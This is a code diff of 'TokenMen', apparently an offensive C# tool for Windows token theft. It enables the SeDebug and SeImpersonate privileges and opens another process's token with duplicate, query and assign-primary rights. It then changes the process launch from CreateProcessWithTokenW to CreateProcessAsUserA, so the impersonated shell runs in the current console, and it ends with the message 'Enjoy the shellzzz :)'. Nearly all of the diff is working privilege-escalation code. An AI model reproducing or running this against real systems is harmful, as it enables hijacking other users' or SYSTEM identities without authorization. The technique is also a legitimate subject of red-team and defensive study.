@@ -1,4 +1,6 @@
-﻿namespace TokenMen;
+﻿using System.Text;
+
+namespace TokenMen;
 
 public class Program
 {
@@ -27,6 +29,7 @@ public class Program
 
         
         Console.WriteLine("[!] Adjusting Privileges");
+        //string[] privileges = { SE_DEBUG_NAME, SE_IMPERSONATE_NAME };
         string[] privileges = { SE_DEBUG_NAME, SE_IMPERSONATE_NAME };
         
         if (!Utils.PrivilegeEnabler(privileges))
@@ -43,7 +46,7 @@ public class Program
         Console.WriteLine($"[+] Got handle to process");
 
         // Get Handle to the Process's Token
-        bool res = OpenProcessToken(hProc, TokenAccessRights.TOKEN_DUPLICATE, out IntPtr hToken);
+        bool res = OpenProcessToken(hProc, TokenAccessRights.TOKEN_DUPLICATE|TokenAccessRights.TOKEN_QUERY|TokenAccessRights.TOKEN_ASSIGN_PRIMARY, out IntPtr hToken);
         if (!res)
         {
             Console.WriteLine($"[-] Failed to get token handle. (Error: {GetLastErrorString()})");
@@ -61,7 +64,7 @@ public class Program
         }
         Console.WriteLine("[+] Token duplicated Successfully");
 
-
+        // TODO: restore ACL
         if (changeAcl)
         {
             bool OK = Acl.ChangeDesktopACL();
@@ -78,13 +81,36 @@ public class Program
         var si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(si);
 
-        bool CreateProcessW = CreateProcessWithTokenW(hDupToken, 0, null, executableToLaunch, 0, IntPtr.Zero, null, ref si, out pi);
-        if (!CreateProcessW)
+        #region Spawn New Console
+        //bool CreateProcessW = CreateProcessWithTokenW(hDupToken, 0, null, executableToLaunch, 0, IntPtr.Zero, null, ref si, out pi);
+        //if (!CreateProcessW)
+        //{
+        //    Console.WriteLine($"[-] CreateProcessWithTokenW Failed. (Error: {GetLastErrorString()})");
+        //    return;
+        //}
+        //Console.WriteLine("[+] CreateProcessWithTokenW Success");
+        #endregion
+
+        #region Interact with current console
+        // The token handle must have the TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY access right
+        StringBuilder sbDirectory = new(260);
+        uint dirRes = GetSystemDirectoryW(sbDirectory, (uint)sbDirectory.Capacity);
+
+        /// require SE_ASSIGNPRIMARYTOKEN_NAME (This API will auto enable it)
+        /// If PowerShell launch, first thing type "exit" otherwise the terminal messes up
+        bool success = CreateProcessAsUserA(hDupToken,null, executableToLaunch, IntPtr.Zero, IntPtr.Zero, false,
+            0, IntPtr.Zero, sbDirectory.ToString(), ref si, out pi);
+        if (!success)
         {
-            Console.WriteLine($"[-] CreateProcessWithTokenW Failed. (Error: {GetLastErrorString()})");
+            Console.WriteLine("[-] CreateProcessAsUserW Failed. (Error: {0})", GetLastErrorString());
+            Console.WriteLine("You may not have \"SeAssignPrimaryTokenPrivilege\" privilege");
+            Console.WriteLine("Use me again without interactive flag");
             return;
         }
-        Console.WriteLine("[+] CreateProcessWithTokenW Success");
+
+        #endregion
+        
+        Console.WriteLine("[+] Enjoy the shellzzz :) ");
     }
 
 
